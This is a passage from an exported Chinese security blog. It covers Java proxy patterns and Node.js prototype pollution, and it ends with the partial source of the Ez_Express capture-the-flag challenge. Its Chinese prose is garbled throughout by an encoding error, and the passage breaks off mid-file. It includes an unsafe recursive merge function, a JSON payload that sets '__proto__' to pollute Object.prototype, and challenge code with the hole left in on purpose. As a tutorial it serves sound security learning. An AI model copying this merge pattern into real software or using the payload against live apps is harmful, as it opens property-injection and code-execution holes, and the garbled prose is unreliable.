1](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/Untitled%201.png)\n\nä½†æ˜¯ç°åœ¨æˆ¿ä¸œä¸æƒ³å¤„ç†ä¸€äº›åœ¨ç§Ÿæˆ¿è¿‡ç¨‹ä¸­éœ€è¦è¿›è¡Œçš„ç¹çæ­¥éª¤ï¼Œæ¯”å¦‚æ‰“å¹¿å‘Šå•Šï¼Œå’Œç§Ÿå®¢è®®ä»·ç­‰ç­‰ï¼Œæ‰€ä»¥è¿™æ—¶å€™å‡ºç°äº†ä¸€ä¸ªæ–°è§’è‰²ï¼Œå«åšä¸­ä»‹ï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ¿ä¸œæ‰€åšçš„äº‹åªæœ‰å‡ºç§Ÿè‡ªå·±çš„æˆ¿å­ï¼Œå…¶ä»–äº‹é¡¹å…¨éƒ¨äº¤ç”±ä¸­ä»‹æ¥åšï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™ç§Ÿå®¢å¦‚æœæƒ³ç§Ÿæˆ¿å­æ˜¯ä¸èƒ½ç›´æ¥æ‰¾åˆ°æˆ¿ä¸œçš„ï¼Œå¿…é¡»åœ¨ä¸­é—´ç»ç”±ä¸­ä»‹ï¼Œä¸­ä»‹æ¥å®Œæˆå¤§éƒ¨åˆ†äº‹å®œï¼Œå¹¶ä¸”åœ¨æ­¤æ—¶ä¸­ä»‹ä¸æˆ¿ä¸œå…±åŒå®Œæˆç§Ÿæˆ¿è¿™ä»¶äº‹ï¼š\n\n![Untitled](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/Untitled.png)\n\n## é™æ€ä»£ç†\n\nè§’è‰²åˆ†æï¼š\n\n- æŠ½è±¡è§’è‰²ï¼ˆç§Ÿæˆ¿è¿™ä»¶äº‹ï¼‰ï¼šä¸€èˆ¬ä¼šä½¿ç”¨æŠ½è±¡ç±»æˆ–è€…æ¥å£æ¥è§£å†³\n- çœŸå®è§’è‰²ï¼ˆæˆ¿ä¸œï¼‰ï¼šè¢«ä»£ç†çš„è§’è‰²\n- ä»£ç†è§’è‰²ï¼ˆä¸­ä»‹ï¼‰ï¼šä»£ç†çœŸå®è§’è‰²ï¼Œä»£ç†çœŸå®è§’è‰²åï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¼šåšä¸€äº›é™„å±æ“ä½œ\n- å®¢æˆ·ï¼ˆç§Ÿå®¢ï¼‰ï¼šè®¿é—®ä»£ç†å¯¹è±¡çš„äºº\n\nä»£ç å®ç°ï¼š\n\nç§Ÿæˆ¿ Rentæ¥å£ï¼š\n\n```java\npackage com.y1zh3e7.demo01;\n\npublic interface Rent {\n    public void rent();\n}\n```\n\næˆ¿ä¸œ Hostç±»ï¼š\n\n```java\npackage com.y1zh3e7.demo01;\n\npublic class Host implements Rent{\n    public void rent()\n    {\n        System.out.println(\"æˆ¿ä¸œè¦å‡ºç§Ÿæˆ¿å­\");\n    }\n}\n```\n\nä¸­ä»‹ Proxyç±»ï¼š\n\n```java\npackage com.y1zh3e7.demo01;\n\npublic class Proxy implements Rent{\n    private Host host;\n\n    public Proxy() {\n    }\n\n    public Proxy(Host host) {\n        this.host = host;\n    }\n    public void rent(){\n        host.rent();\n        seeHouse();\n        getFare();\n    };\n\n    public void seeHouse()\n    {\n        System.out.println(\"ä¸­ä»‹å¸¦ä½ çœ‹æˆ¿\");\n    }\n\n    public void getFare()\n    {\n        System.out.println(\"ä¸­ä»‹æ”¶ä¸­ä»‹è´¹äº†\");\n    }\n}\n```\n\nç§Ÿå®¢ Clientç±»ï¼š\n\n```java\npackage com.y1zh3e7.demo01;\n\npublic class Client {\n    public static void main(String[] args) {\n        Host host = new Host();\n        Proxy proxy = new Proxy(host);\n    }\n}\n```\n\nå¯ä»¥å‘ç°æˆ¿ä¸œåªä¸“æ³¨å®ç°äº†ç§Ÿæˆ¿è¿™ä»¶äº‹ï¼Œè€Œä¸­ä»‹ä¸ä»…å¸®æˆ¿ä¸œå®ç°äº†ç§Ÿæˆ¿ï¼Œè€Œä¸”è‡ªå·±ä¹Ÿæ·»åŠ äº†æ ¼å¤–çš„åŠŸèƒ½ï¼Œæ¯”å¦‚çœ‹æˆ¿æ”¶ä¸­ä»‹è´¹ç­‰ç­‰ã€‚\n\nä»£ç†æ¨¡å¼çš„å¥½å¤„ï¼š\n\n- å¯ä»¥æ—¶çœŸæ˜¯è§’è‰²çš„ç›®çš„æ›´åŠ çº¯ç²¹ï¼Œä¸ç”¨å»å…³æ³¨ä¸€äº›å…¬å…±çš„ä¸šåŠ¡\n- å…¬å…±ä¸šåŠ¡äº¤ç»™ä»£ç†è§’è‰²ï¼Œå®ç°äº†ä¸šåŠ¡çš„åˆ†å·¥\n- å…¬å…±ä¸šåŠ¡å‘ç”Ÿæ‰©å±•æ—¶ï¼Œä¾¿äºé›†ä¸­ç®¡ç†\n\nç¼ºç‚¹ï¼š\n\n- ä¸€ä¸ªçœŸå®è§’è‰²å°±ä¼šäº§ç”Ÿä¸€ä¸ªä»£ç†è§’è‰²ï¼Œä»£ç é‡ç¿»å€ï¼Œå¼€å‘æ•ˆç‡å˜ä½\n\n## åŠ¨æ€ä»£ç†\n\n- åŠ¨æ€ä»£ç†å’Œé™æ€ä»£ç†è§’è‰²ä¸€æ ·\n- åŠ¨æ€ä»£ç†çš„ä»£ç†ç±»æ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œä¸æ˜¯æˆ‘ä»¬ç›´æ¥å†™å¥½çš„\n- åŠ¨æ€ä»£ç†åˆ†ä¸ºä¸‰å¤§ç±»ï¼š\n  - åŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†â€”â€”JDKçš„åŠ¨æ€ä»£ç†\n  - åŸºäºç±»çš„åŠ¨æ€ä»£ç†â€”â€”cglib\n  - javaå­—èŠ‚ç å®ç°â€”â€”Javassist\n\nåŠ¨æ€ä»£ç†éœ€è¦äº†è§£ä¸¤ä¸ªç±»ï¼šProxyï¼šä»£ç†ï¼ŒInvocationHandlerï¼šè°ƒç”¨å¤„ç†ç¨‹åº\n\næ•´ä¸ªåŠ¨æ€ä»£ç†å¤§æ¦‚æµç¨‹å¦‚ä¸‹ï¼š\n\n- Proxy.newProxyInstance ç”Ÿæˆä¸€ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡proxyï¼Œå¹¶ä¸”å‘Šè¯‰è¿™ä¸ªproxyè¦ä»£ç†å“ªä¸ªæ¥å£ï¼Œè¿™é‡Œæ³¨æ„æ­¤æ—¶å¿…é¡»è¦æ˜¯æ¥å£æ‰è¡Œï¼ŒåŠ¨æ€ä»£ç†æ˜¯æ— æ³•ä»£ç†ä¸€ä¸ªç±»çš„ï¼Œå› æ­¤å½“åŠ¨æ€ä»£ç†æ¥æ”¶åˆ°ä¸€ä¸ªç±»æ—¶è¦è½¬ä¸ºè¯¥ç±»æ‰€ç»§æ‰¿çš„æ¥å£ã€‚\n- å®¢æˆ·è°ƒç”¨è¢«ä»£ç†å¯¹è±¡çš„æŸä¸€æ–¹æ³•ï¼Œæ­¤æ—¶javaä¼šå°†è®¿é—®ä»£ç†å¯¹è±¡è¿™ä¸ªè¯·æ±‚è½¬å‘ç»™åŠ¨æ€ä»£ç†å¯¹è±¡proxyï¼Œå¹¶ä¸”åœ¨proxyçš„invokeä¸­å®ç°è¯¥æ–¹æ³•\n\n### ä»£ç å®ç°ï¼š\n\nRentæ¥å£ è¢«ä»£ç†å¯¹è±¡å’Œproxyå¯¹è±¡å…±åŒå®ç°çš„æ¥å£ï¼š\n\n```java\npackage com.y1zh3e7.demo03;\n\npublic interface Rent {\n    public void rent();\n}\n```\n\nHost è¢«ä»£ç†å¯¹è±¡:\n\n```java\npackage com.y1zh3e7.demo03;\n\npublic class Host implements Rent {\n    public void rent()\n    {\n        System.out.println(\"æˆ¿ä¸œè¦å‡ºç§Ÿæˆ¿å­\");\n    }\n}\n```\n\nåŠ¨æ€ä»£ç†å·¥å…·ç±» ProxyInvocationHandlerï¼š\n\n```java\npackage com.y1zh3e7.demo03;\n\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\n\npublic class ProxyInvocationHandler implements InvocationHandler {\n    private Rent rent;\n\n\t\t// ä½¿ç”¨åŠ¨æ€ä»£ç†æ—¶é€šè¿‡setterä¼ å…¥è¦è¢«ä»£ç†çš„å¯¹è±¡\n    public void setRent(Rent rent) {\n        this.rent = rent;\n    }\n\n\t\t// é€šè¿‡getProxyæ–¹æ³•è·å¾—ä¸€ä¸ªåŠ¨æ€ä»£ç†å®ä¾‹\n    public Object getProxy()\n    {\n\t\t\t// é€šè¿‡Proxy.newProxyInstanceåˆå§‹åŒ–ä¸€ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡å‡ºæ¥ ä¸‰ä¸ªå‚æ•°åŸºæœ¬ä¸Šåªæœ‰ç¬¬äºŒä¸ªæ˜¯å˜åŒ–çš„ï¼Œä¸ºè¢«ä»£ç†çš„æ¥å£ï¼Œå…¶ä»–ä¸¤ä¸ªå‚æ•°å¯ä»¥åƒè¿™é‡Œä¸€æ ·å†™æ­»\n        return Proxy.newProxyInstance(this.getClass().getClassLoader(), rent.getClass().getInterfaces(), this);\n    }\n\n    @Override\n\t\t// å½“è°ƒç”¨ä¸€ä¸ªè¢«ä»£ç†å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œä¼šåœ¨æ­¤å¤„æ‰§è¡Œï¼Œinvokeå†…å¯ä»¥è‡ªå·±æ„é€ å¦‚ä½•æ‰§è¡Œè¯¥æ–¹æ³•ï¼Œä»è€Œè¾¾åˆ°äº†æ‰©å±•æ–¹æ³•åŠŸèƒ½çš„ç›®çš„\n\t\t// ä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä¸º ä»£ç†å¯¹è±¡ ä»£ç†å¯¹è±¡è¢«è°ƒç”¨çš„æ–¹æ³• è°ƒç”¨è¯¥æ–¹æ³•çš„å‚æ•°\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n       Object result =  method.invoke(rent,args);\n        return result;\n    }\n}\n```\n\nClient\n\n```java\npackage com.y1zh3e7.demo03;\n\npublic class Client {\n    public static void main(String[] args) {\n        Host host = new Host();\n        ProxyInvocationHandler pih = new ProxyInvocationHandler();\n        pih.setRent(host); // å°†è¦ä»£ç†çš„å¯¹è±¡è®¾ç½®ä¸ºhost\n        Rent proxy = (Rent) pih.getProxy(); // æ‹¿åˆ°è¢«ä»£ç†æ¥å£çš„ä»£ç†å¯¹è±¡\n        proxy.rent(); // è°ƒç”¨è¯¥æ–¹æ³•åä¼šå°†è¿™ä¸ªæ–¹æ³•ä¼ ç»™ä»£ç†å¯¹è±¡ä¸­çš„invokeæ–¹æ³•æ¥æ‰§è¡Œ\n    }\n}\n```\n","tags":["Javaååºåˆ—åŒ–"],"categories":["WebSec"]},{"title":"NodejsåŸå‹é“¾æ±¡æŸ“","url":"/2023/04/21/NodejsåŸå‹é“¾æ±¡æŸ“/","content":"# NodejsåŸå‹é“¾æ±¡æŸ“\n\n## Nodejsä¸JavaScriptå’ŒJSON\n\næœ‰ä¸€äº›äººåœ¨å­¦ä¹ JavaScriptæ—¶ä¼šåˆ†ä¸æ¸…Nodejså’ŒJavaScriptä¹‹é—´çš„åŒºåˆ« å¦‚æœæ²¡æœ‰node é‚£ä¹ˆæˆ‘ä»¬çš„JavaScriptä»£ç åˆ™ç”±æµè§ˆå™¨ä¸­çš„JavaScriptè§£æå™¨è¿›è¡Œè§£æ å‡ ä¹æ‰€æœ‰çš„æµè§ˆå™¨éƒ½é…å¤‡äº†JavaScriptçš„è§£æåŠŸèƒ½ï¼ˆæœ€å‡ºåçš„å°±æ˜¯googleçš„v8ï¼‰ è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬èƒ½åœ¨f12ä¸­ç›´æ¥æ‰§è¡ŒJavaScriptçš„åŸå›   è€ŒNodejsåˆ™æ˜¯ç”±è¿™ä¸ªè§£æå™¨å•ç‹¬ä»æµè§ˆå™¨ä¸­æ‹¿å‡ºæ¥ å¹¶è¿›è¡Œäº†ä¸€ç³»åˆ—çš„å¤„ç† æœ€åæˆä¸ºäº†ä¸€ä¸ªå¯ä»¥åœ¨æœåŠ¡ç«¯è¿è¡ŒJavaScriptçš„ç¯å¢ƒ  è¿™é‡Œçœ‹åˆ°ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ å­¦è¿‡javaçš„å¸ˆå‚…åº”è¯¥å°±æ˜ç™½äº†\n\n![image-20220730001418207](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207300014261.png)\n\né‚£ä¹ˆJSONåˆæ˜¯ä»€ä¹ˆå‘¢ ç®€å•æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯JavaScriptçš„å¯¹è±¡è¡¨ç¤ºæ–¹æ³• å®ƒè¡¨ç¤ºçš„æ˜¯å£°æ˜å¯¹è±¡çš„ä¸€ç§æ ¼å¼  ç”±äºæˆ‘ä»¬ä»å‰ç«¯æ¥æ”¶åˆ°çš„æ•°æ®åŸºæœ¬éƒ½æ˜¯å­—ç¬¦ä¸² å› æ­¤åœ¨æœåŠ¡ç«¯å¦‚æœè¦å°†è¿™äº›å­—ç¬¦ä¸²å¤„ç†ä¸ºå…¶ä»–æ ¼å¼ æ¯”å¦‚å¯¹è±¡ å°±éœ€è¦ç”¨åˆ°JSONäº† \n\n![image-20220730002328146](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207300023195.png)\n\n\n\n## åŸå‹å¯¹è±¡ï¼ˆ`prototype`ï¼‰ä¸åŸå‹è¿æ¥ç‚¹ï¼ˆ`__proto__`ï¼‰ä¸åŸå‹é“¾\n\n![image-20220730145926681](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301459737.png)\n\nåœ¨c++æˆ–javaè¿™äº›é¢å‘å¯¹è±¡çš„è¯­è¨€ä¸­ æˆ‘ä»¬å¦‚æœæƒ³è¦ä¸€ä¸ªå¯¹è±¡é¦–å…ˆéœ€è¦ä½¿ç”¨å…³é”®å­—classå£°æ˜ä¸€ä¸ªç±» å†ä½¿ç”¨å…³é”®å­—newä¸€ä¸ªå¯¹è±¡å‡ºæ¥ ä½†æ˜¯åœ¨JavaScriptä¸­æ²¡æœ‰class ä»¥åŠç±»è¿™ç§æ¦‚å¿µï¼ˆä¸ºäº†ç®€åŒ–ç¼–å†™JavaScriptä»£ç ï¼ŒECMAScript 6åå¢åŠ äº†`class`è¯­æ³•ï¼Œä½†`class`å…¶å®åªæ˜¯ä¸€ä¸ªè¯­æ³•ç³–ï¼‰ åœ¨JavaScriptæœ‰è¿™ä¹ˆä¸¤ç§å£°æ˜å¯¹è±¡çš„æ–¹å¼ ä¸ºäº†å¥½ç†è§£æˆ‘ä»¬å…ˆå¼•å…¥ç±»çš„æ€æƒ³\n\n```javascript\nperson=new Object()\nperson.firstname=\"John\";\nperson.lastname=\"Doe\";\nperson.age=50;\nperson.eyecolor=\"blue\";\n\nè¿™ç§åˆ›å»ºå¯¹è±¡çš„æ–¹æ³•è¿˜æœ‰å¦ä¸€ç§å†™æ³• å¦‚ä¸‹\nperson={firstname:\"John\",lastname:\"Doe\",age:50,eyecolor:\"blue\"};\n\nè¿™ç§æ–¹æ³•é€šè¿‡ç›´æ¥å®ä¾‹åŒ–æ„é€ æ–¹æ³•Object()æ¥åˆ›å»ºå¯¹è±¡\n```\n\n```JavaScript\nfunction person(firstname,lastname,age,eyecolor)  è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªâ€œç±»â€ ä½†æ˜¯åœ¨JavaScriptä¸­å«åšæ„é€ å‡½æ•°æˆ–è€…æ„é€ å™¨\n{\n    this.firstname=firstname;\n    this.lastname=lastname;\n    this.age=age;\n    this.eyecolor=eyecolor;\n}\nvar myFather=new person(\"John\",\"Doe\",50,\"blue\");\té€šè¿‡è¿™ä¸ªâ€œç±»â€å®ä¾‹åŒ–å¯¹è±¡\nvar myMother=new person(\"Sally\",\"Rally\",48,\"green\");\n\nè¿™ç§æ–¹æ³•å…ˆåˆ›å»ºæ„é€ å‡½æ•° å†å®ä¾‹åŒ–æ„é€ å‡½æ•° æ„é€ å‡½æ•°functionä¹Ÿå±äºObject å¦‚æœå¯¹è¿™é‡Œä¸ºä»€ä¹ˆå±äºObjectè€Œä¸å±äºFunctionæœ‰ç–‘é—®è¯·ç»§ç»­é˜…è¯» ä¸‹é¢ä¼šè§£é‡Š\n```\n\næ—¢ç„¶æ˜¯é€šè¿‡å®ä¾‹åŒ–Objectæ¥åˆ›å»ºå¯¹è±¡æˆ–åˆ›å»ºæ„é€ å‡½æ•°\n\n åœ¨JavaScriptä¸­æœ‰ä¸¤ä¸ªå¾ˆç‰¹æ®Šçš„å¯¹è±¡ Function() å’Œ Object()  å®ƒä»¬ä¸¤ä¸ªæ—¢æ˜¯æ„é€ å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ ä½œä¸ºå¯¹è±¡æ˜¯ä¸æ˜¯åº”è¯¥æœ‰ä¸€ä¸ªâ€œç±»â€å»ä½œä¸ºä»–ä»¬çš„æ¨¡æ¿å‘¢\n\nå¯¹äºObject()æ¥è¯´ è¦å£°æ˜è¿™ä¹ˆä¸€ä¸ªæ„é€ å‡½æ•°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…³é”®å­—functionæ¥åˆ›å»º ï¼ˆåœ¨åº•å±‚ ä½¿ç”¨functionåˆ›å»ºä¸€ä¸ªå‡½æ•° å…¶å®å°±ç›¸å½“äºè¿™ä¸ªè¿‡ç¨‹ï¼‰ \n\n```javascript\nfunction Object()\n{\n\n}\nåœ¨åº•å±‚ä¸º\nvar Object = new Function();\n```\n\né‚£ä¹ˆå¯¹äºFunctionè‡ªå·±è¿™ä¸ªå¯¹è±¡ä»–æ˜¯æ€ä¹ˆæ¥çš„å‘¢ å¦‚æœç”¨Function.`__proto__`å’ŒFunction.prototypeè¿›è¡Œæ¯”è¾ƒå‘ç°äºŒè€…æ˜¯å…¨ç­‰çš„ æ‰€ä»¥Functionåˆ›é€ äº†è‡ªå·± ä¹Ÿåˆ›é€ äº†Object æ‰€ä»¥JavaScriptä¸­ æ‰€æœ‰å‡½æ•°éƒ½æ˜¯å¯¹è±¡ è€Œå¯¹è±¡æ˜¯é€šè¿‡å‡½æ•°åˆ›å»ºçš„ å› æ­¤`æ„é€ å‡½æ•°.prototype.__proto__ `åº”è¯¥æ˜¯Object.prototype è€Œä¸æ˜¯Function.prototype   Functionçš„ä½œç”¨æ˜¯åˆ›å»ºè€Œä¸æ˜¯ç»§æ‰¿\n\n![image-20220730140259067](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301402091.png)\n\n![image-20220730140053998](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301401083.png)\n\né‚£ä¹ˆæåˆ°äº†`__proto__`å’Œ`prototype`æˆ‘ä»¬å°±æ¥è¯´è¯´è¿™ä¸¤ä¸ªæ˜¯ä»€ä¹ˆä¸œè¥¿\n\né¦–å…ˆæˆ‘ä»¬è¦äº†è§£ä»¥ä¸‹æ¦‚å¿µ\n\n- `__proto__`æ˜¯ä»»ä½•ä¸€ä¸ªå¯¹è±¡æ‹¥æœ‰çš„å±æ€§    `prototype`æ˜¯ä»»ä½•ä¸€ä¸ªå‡½æ•°æ‹¥æœ‰çš„ä¸€ä¸ªå±æ€§  \n\næ¯”å¦‚\n\n```JavaScript\nperson={firstname:\"John\",lastname:\"Doe\",age:50,eyecolor:\"blue\"};\n```\n\né‚£ä¹ˆè¿™ä¸ªpersonå¯¹è±¡å°±æ‹¥æœ‰äº†`person.__proto__`è¿™ä¸ªå±æ€§ è€ŒObject()æˆ‘ä»¬åˆšæ‰æåˆ°äº†æ˜¯ç”±Functionåˆ›å»ºæ¥çš„ä¸€ä¸ªæ„é€ å‡½æ•° é‚£ä¹ˆObjectå°±å¤©ç”Ÿæœ‰äº†Object.prototype \n\n- æŸä¸€å¯¹è±¡çš„ `__proto__`æŒ‡å‘å®ƒçš„prototypeï¼ˆåŸå‹å¯¹è±¡ï¼‰ ä¹Ÿå°±æ˜¯è¯´å¦‚æœç›´æ¥è®¿é—®`person.__proto__` é‚£ä¹ˆå°±ç›¸å½“äºè®¿é—®äº†Object.prototype\n- JavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿æœºåˆ¶\n- æ„é€ å‡½æ•°xxx.prototypeæ˜¯ä¸€ä¸ªå¯¹è±¡ xxx.prototypeä¹Ÿæœ‰è‡ªå·±çš„`__proto__`å±æ€§ å¹¶ä¸”å¯ä»¥ç»§ç»­æŒ‡å‘å®ƒçš„çš„prototype\n- Object.prototype.protoæœ€ç»ˆæŒ‡å‘null è¿™ä¹Ÿæ˜¯æ‰€æœ‰åŸå‹é“¾çš„ç»ˆç‚¹\n- ä»ä¸€ä¸ªå¯¹è±¡çš„`__proto__`ä¸æ–­å‘ä¸ŠæŒ‡å‘åŸå‹å¯¹è±¡æœ€ç»ˆæŒ‡å‘Objecct.prototypeåæ¥ç€æŒ‡å‘ä¸ºNull è¿™ä¸€æ¡é“¾å­å°±å«åšåŸå‹é“¾\n\næœ‰æ¡ä»¶çš„å¸ˆå‚…ä¹Ÿå¯ä»¥æŠŠä¸‹é¢çš„è§†é¢‘åˆé›†çœ‹ä¸€ä¸‹ å¯¹ç†è§£åŸå‹å’ŒåŸå‹é“¾æœ‰å¾ˆå¤§çš„å¸®åŠ©\n\n[4_Functionä¸Objectçš„ç‰¹æ®Šæ€§_å“”å“©å“”å“©_bilibili](https://www.bilibili.com/video/BV1ci4y157Ci?p=4&spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=ce28d3130b8ba56f85e090c857c00132)\n\n å¦‚æœæˆ‘ä»¬æœ‰å¦‚ä¸‹ä»£ç ï¼š\n\n```JavaScript\nfunction Father() {\n    this.first_name = 'Donald'\n    this.last_name = 'Trump'\n}\n\nfunction Son() {\n    this.first_name = 'Melania'\n}\n\nSon.prototype = new Father()\n\nlet son = new Son()\nconsole.log(`Name: ${son.first_name} ${son.last_name}`)\n```\n\né‚£ä¹ˆæŒ‰ç…§ä¸Šè¿°è¯´æ³• å°±æœ‰å¦‚ä¸‹ç»“æ„\n\n![image-20220730150413742](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301504781.png)\n\nå¯¹äºå¯¹è±¡sonï¼Œåœ¨è°ƒç”¨`son.last_name`çš„æ—¶å€™ï¼Œå®é™…ä¸ŠJavaScriptå¼•æ“ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š\n\n1. åœ¨å¯¹è±¡sonä¸­å¯»æ‰¾last_name\n2. å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨`son.__proto__`ä¸­å¯»æ‰¾last_name\n3. å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨`son.__proto__.__proto__`ä¸­å¯»æ‰¾last_name\n4. ä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°`null`ç»“æŸã€‚\n\n## åŸå‹é“¾æ±¡æŸ“\n\nä¸¾ä¸ªæ —å­\n\n```JavaScript\n// è¿™ä¸ªå¯¹è±¡ç›´æ¥å®ä¾‹åŒ–Object()\nlet foo = {bar: 1}\n\n// foo.bar æ­¤æ—¶ä¸º1\nconsole.log(foo.bar)\n\n// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰\nfoo.__proto__.bar = 2\n\n// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1\nconsole.log(foo.bar)\n\n// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡\nlet zoo = {}\n\n// æŸ¥çœ‹zoo.bar\nconsole.log(zoo.bar)\n```\n\n![image-20220730154030880](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301540927.png)\n\nè¿™é‡Œç”±äºä¿®æ”¹äº†`foo.__proto__.bar` ä¹Ÿå°±æ˜¯ä¿®æ”¹äº†Object.bar å› æ­¤åœ¨åç»­çš„å®ä¾‹åŒ–å¯¹è±¡ä¸­ æ–°çš„å¯¹è±¡ä¼šç»§æ‰¿è¿™ä¸€å±æ€§ é€ æˆäº†åŸå‹é“¾æ±¡æŸ“\n\nåœ¨å®é™…åº”ç”¨ä¸­ï¼Œå“ªäº›æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨åŸå‹é“¾èƒ½è¢«æ”»å‡»è€…ä¿®æ”¹çš„æƒ…å†µå‘¢ï¼Ÿ\n\næˆ‘ä»¬æ€è€ƒä¸€ä¸‹ï¼Œå“ªäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è®¾ç½®`__proto__`çš„å€¼å‘¢ï¼Ÿå…¶å®æ‰¾æ‰¾èƒ½å¤Ÿæ§åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„â€œé”®åâ€çš„æ“ä½œå³å¯\n\nçœ‹ä¸‹é¢ä»£ç  ä¸€ä¸ªç®€å•çš„å¯¹è±¡clone\n\n```JavaScript\nfunction merge(target, source) {\n    for (let key in source) {\n        if (key in source && key in target) {  \n            // å¦‚æœtargetä¸sourceæœ‰ç›¸åŒçš„é”®å åˆ™è®©targetçš„é”®å€¼ä¸ºsourceçš„é”®å€¼\n            merge(target[key], source[key])\n        } else {\n            target[key] = source[key]  // å¦‚æœtargetä¸sourceæ²¡æœ‰ç›¸é€šçš„é”®å åˆ™ç›´æ¥åœ¨targetæ–°å»ºé”®åå¹¶èµ‹ç»™é”®å€¼\n        }\n    }\n}\nlet o1 = {}\nlet o2 = {a: 1, \"__proto__\": {b: 2}}\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n\no3 = {}\nconsole.log(o3.b)\n```\n\n![image-20220730155049173](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301550219.png)\n\nè¿™é‡Œæ‰§è¡Œåå‘ç° è™½ç„¶ä¸¤ä¸ªå¯¹è±¡æˆåŠŸclone ä½†æ˜¯Object()å¹¶æ²¡ç”¨è¢«æ±¡æŸ“ è¿™æ˜¯å› ä¸ºåœ¨åˆ›å»ºo2æ—¶ `__proto__`æ˜¯å·²ç»å­˜åœ¨äºo2ä¸­çš„å±æ€§äº† è§£æå™¨å¹¶ä¸èƒ½å°†è¿™ä¸ªå±æ€§è§£æä¸ºé”®å€¼ æ‰€ä»¥è¦ç”¨JSONå»ä¿®æ”¹ä»£ç ï¼ˆå‰é¢æˆ‘ä»¬è¯´äº† JSONæ˜¯JavaScriptçš„å¯¹è±¡è¡¨ç¤ºæ–¹æ³• å¯ä»¥å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯¹è±¡ï¼‰ è¿™æ ·å°±å¯ä»¥ä½¿`__proto__`è¢«æˆåŠŸè§£ææˆé”®åäº†\n\n```JavaScript\nlet o1 = {}\nlet o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}')\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n\no3 = {}\nconsole.log(o3.b)\n```\n\n![image-20220730155547273](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301555313.png)\n\n## æ¼æ´å¤ç°\n\n### [GYCTF2020]Ez_Express\n\nè¿›å…¥ç¯å¢ƒä¹‹åæ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ æµ‹è¯•ä¹‹åå‘ç°å­˜åœ¨www.zipæºç æ³„éœ² å¼€å§‹å®¡è®¡index.js\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\nconst isObject = obj => obj && obj.constructor && obj.constructor === Object;\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}\nconst clone = (a) => {\n  return merge({}, a);\n}\nfunction safeKeyword(keyword) {\n  if(keyword.match(/(admin)/is)) {\n      return keyword\n  }\n\n  return undefined\n}\n\nrouter.get('/', function (req, res) {\n  if(!req.session.user){\n    res.redirect('/login');\n  }\n  res.outputFunctionName=undefined;\n  res.render('index',data={'user':req.session.user.user});\n});\n\n\nrouter.get('/login', function (req, res) {\n  res.render('login');\n});\n\n\n\nrouter.post('/login', function (req, res) {\n  if(req.body.Submit==\"register\"){\n   if(safeKeyword(req.body.userid)){\n    res.end(\"<script>alert('forbid word');history.go(-1);</script>\") \n   }\n    req.session.user={\n      'user':req.body.userid.toUpperCase(),\n      'passwd': req.body.pwd,\n      'isLogin':false\n    }\n    res.redirect('/'); \n  }\n  else if(req.body.Submit==\"login\"){\n    if(!req.session.user){res.end(\"<script>alert('register first');history.go(-1);</script>\")}\n    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){\n      req.session.user.isLogin=true;\n    }\n    else{\n      res.end(\"<script>alert('error passwd');history.go(-1);</script>\")\n    }\n  \n  }\n  res.redirect('/'); ;\n});\nrouter.post('/action', function (req, res) {\n  if(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n  req.session.user.data = clone(req.body);\n  res.end(\"<script>alert('success');history.go(-1);</script>\");  \n});\nrouter.get('/info', function (req, res) {\n  res.render('index',data={'user':res.outputFunctionName});\n})\nmodule.exports = 